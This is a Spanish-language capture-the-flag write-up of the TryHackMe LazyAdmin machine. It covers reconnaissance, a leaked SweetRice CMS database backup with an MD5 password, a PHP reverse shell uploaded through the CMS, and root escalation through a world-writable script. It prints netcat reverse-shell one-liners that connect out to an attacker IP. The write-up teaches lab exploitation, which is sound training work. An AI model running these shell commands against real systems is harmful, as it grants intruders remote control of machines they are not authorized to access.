---
title:  CTF TryHackme LazyAdmin
tags:
  - Tryhackme
  - Linux
---

<div class="card mb-3">
    <center>
            <img class="card-img-top" src="/theme/img/THM/LazyAdmin/titulo_lazyadmin.jpeg"/>
    </center>
</div>

Máquina: Linux

IP: 10.10.222.100

Creada por MrSeth6797

<!--more-->

## User flag

Se realiza un reconocimiento para ver qué puertos tiene abiertos la máquina usando **nmap**:

```bash
nmap -p- 10.10.222.100
```
<div class="card mb-3">
    <center>
            <img class="card-img" src="/theme/img/THM/LazyAdmin/nmap.png"/>
    </center>
</div>

Los puertos abiertos son el 22/tcp(SSH) y 80/tcp (HTTP).

En el puerto 80, está la página principal que es la de Apache. Se procede a ejecutar **gobuster** para ver qué directorios están ocultos.

```bash
gobuster -u http://10.10.222.100/ -w /usr/share/wordlist/SecLists/Discovery/Web-Content/common.txt
```

Como resultado se obtiene un directorio interesante que es **/content**. Una vez dentro se encuentra un CMS Sweet Rice que es un administrador para webs. Se usa el **searchploit SweetRice** para ver qué vulnerabilidades tiene.

<div class="card mb-3">
    <center>
            <img class="card-img" src="/theme/img/THM/LazyAdmin/searchploit.png"/>
    </center>
</div>

De estas vulnerabilidades, la interesante es Backip Disclosure que trata de que se puede acceder al backup de mysql de la web que se encuentra en **http://10.10.222.100/content/inc/mysql_backup** y se puede visualizar.

<div class="card mb-3">
    <center>
            <img class="card-img" src="/theme/img/THM/LazyAdmin/mysql_backup.png"/>
    </center>
</div>

Dentro del archivo sql, se encuentra el nombre del usuario **manager** y una contraseña guardado en formato MD5. Se desencripta el hash MD5 y se obtiene la contraseña de manager.

Se accede al panel de SweentRice con las credenciales a través del login **/content/as**.

Una vez dentro, se puede aplicar la vulnerabilidad **SweetRice 1.5.1 - Cross-Site Request Forgery / PHP Code Execution**. En la sección Ads, se añade el siguiente código sustituyendo la parte del código PHP por la de una reverse shell en PHP.

<div class="card mb-3">
    <center>
            <img class="card-img" src="/theme/img/THM/LazyAdmin/crosssite.png"/>
    </center>
</div>

Se sube el código escrito a la página para después abrirlo desde la ruta **/content/inc/ads/shell.php**

<div class="card mb-3">
    <center>
            <img class="card-img" src="/theme/img/THM/LazyAdmin/shellphp.png"/>
    </center>
</div>

Se crea una reverse shell y se obtiene el flag user en la ruta **/home/itguy**

<div class="card mb-3">
    <center>
            <img class="card-img" src="/theme/img/THM/LazyAdmin/userflag.png"/>
    </center>
</div>

## Root Flag

Para elevar privilegios en el sistema, se observan varias cosas:

1. La primera que existe un archivo **backup.pl** con propiedad de root en la carpeta de /home/itguy
2. Con el comando sudo -l, tenemos la posibilidad de ejecutar el archivo backup.pl como sudo mediante perl

<div class="card mb-3">
    <center>
            <img class="card-img" src="/theme/img/THM/LazyAdmin/sudo.png"/>
    </center>
</div>

Se inspecciona el código de backup.pl para saber que hace y se observa que realiza un comando **system sh** para ejecutar el fichero **/etc/copy.sh**. El código de este ejecutable es una shell reverse usando netcat:

```bash
rm /tmp/f;mkfifo /tmp/f;cat /tmp/f|/bin/sh -i 2>&1|nc 192.168.0.190 5554 >/tmp/f
```

Este fichero tiene la opción de que cualquier otro usuario pueda escribir sobre él. Por lo que se modifica la IP con **echo** para que realice la shell hacia nuestro PC.

```bash
echo "rm /tmp/f;mkfifo /tmp/f;cat /tmp/f|/bin/sh -i 2>&1|nc 10.11.22.147 5554 >/tmp/f" > /etc/copy.sh
```

Con esto, se ejecuta **sudo /usr/bin/perl /home/itguy/backup.pl** mientras en otra terminal se tiene el netcat en escucha por el puerto indicado y se obtiene root.

<div class="card mb-3">
    <center>
            <img class="card-img" src="/theme/img/THM/LazyAdmin/rootflag.png"/>
    </center>
</div>